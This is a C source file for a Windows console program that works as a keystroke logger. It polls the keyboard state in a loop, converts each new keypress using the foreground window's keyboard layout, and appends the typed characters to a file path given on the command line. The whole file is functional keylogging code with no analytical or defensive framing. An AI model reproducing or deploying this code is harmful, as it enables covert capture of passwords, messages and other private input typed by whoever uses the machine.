#include "../inc/main.h"

int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR args, int nShow)
{
    HANDLE hFile;

    extern WCHAR **__wargv;
    extern int __argc;

    int con = AttachConsole(ATTACH_PARENT_PROCESS);

    if (con)
    {
        freopen("CON", "w", stdout);
        freopen("CON", "w", stderr);
        SetConsoleOutputCP(CP_UTF8);
    }
    // Make a multibyte copy of argv mainly for debugging
    PSTR *mbszArgv = malloc(sizeof(PSTR *) * __argc);

    if (mbszArgv == NULL)
    {
        if (con)
            fprintf(stderr, "Faild to allocate memory. Exiting with error: %d\n", GetLastError());
        return EXIT_FAILURE;
    }

    for (int i = 0; i < __argc; i++)
    {
        int wstrCharLen = wcslen(__wargv[i]);
        int mbstrByteLen = WideCharToMultiByte(CP_UTF8, 0, __wargv[i], wstrCharLen, NULL, 0, NULL, NULL);
        if (mbstrByteLen == 0)
        {
           fprintf(stderr, "Faild to translate arguments to multibyte. Exiting with error: %d\n", GetLastError());
           return EXIT_FAILURE;
        }
        
        mbszArgv[i] = malloc(mbstrByteLen + 1);
        if (mbszArgv[i] == NULL)
        {
            if (con)
                fprintf(stderr, "Faild to allocate memory. Exiting with error: %d\n", GetLastError());
            return EXIT_FAILURE;
        }

        WideCharToMultiByte(CP_UTF8, 0, __wargv[i], wstrCharLen, mbszArgv[i], mbstrByteLen, NULL, NULL);
        mbszArgv[i][mbstrByteLen] = '\0';
    }

    if (__argc != NUMARGS + 1)
    {
        if (con)
            printf_s("Usage: %s filePath \n", mbszArgv[0]);
        return EXIT_FAILURE;
    }

    hFile = CreateFileW(__wargv[1], FILE_WRITE_DATA, FILE_SHARE_READ, 0, OPEN_ALWAYS, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE)
    {
        if (con)
            fprintf(stderr, "Faild to open %s. Exiting with error: %d\n", mbszArgv[1], GetLastError());
        return EXIT_FAILURE;
    }
    
    SetFilePointerEx(hFile, (LARGE_INTEGER){0}, NULL, FILE_END);

    if (con)
        printf("Program successfuly started");

    MSG msg = {0};

    BYTE bState[256];
    BYTE bPrevState[256];

    while (msg.message != WM_QUIT)
    {
        PeekMessage(&msg, NULL, 0, 0, PM_REMOVE);
        TranslateMessage(&msg);
        DispatchMessage(&msg);

        GetKeyState(0);
        GetKeyboardState(bState);
        for (unsigned int i = 0; i < 256; i++)
        {
            if (bState[i] & (1 << 7) && bPrevState[i] != bState[i]) {
                WCHAR wszBuf[WSZBUFLEN];
                HKL hkl = GetKeyboardLayout(GetWindowThreadProcessId(GetForegroundWindow(), 0));
                int len = ToUnicodeEx(i, 0, bState, wszBuf, WSZBUFLEN, 0, hkl);
                if (len > 0)
                    wszBuf[len] = '\0';
                WriteFile(hFile, wszBuf, len*sizeof(WCHAR), NULL, NULL);
                bPrevState[i] = bState[i];
            }
        }
        Sleep(1);
    }

    CloseHandle(hFile);

    for (int i = 0; i < __argc; i++)
        free(mbszArgv[i]);
    free(mbszArgv);

    return 0;
}
